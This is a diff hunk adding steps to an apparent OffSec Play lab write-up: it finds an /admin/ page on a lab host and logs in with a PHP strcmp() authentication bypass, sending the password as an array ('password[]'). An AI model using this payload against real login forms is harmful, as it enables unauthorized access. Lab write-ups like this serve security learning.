@@ -213,3 +213,18 @@ Target: http://192.168.224.101/
 Task Completed
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/6fdc88e1-c1da-4040-8bfb-dd778d04f881)
+
+```http
+http://192.168.224.101/admin/
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/a58a2bc2-227b-4472-bad1-5bdc586594a4)
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/06812358-4deb-4b0c-a106-b0eb2a5b26d6)
+
+PHP `strcmp()` Authentication Bypass
+[Read..](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016#:~:text=After%20a%20bit%20more%20research,return%20true%20(more%20info).)
+
+```
+username=admin&password[]=%22%22
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/ff103e6a-bbc1-461c-93af-52c3e31f8513)
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/e027a1dd-7584-45d2-b48b-94fed9f7f518)
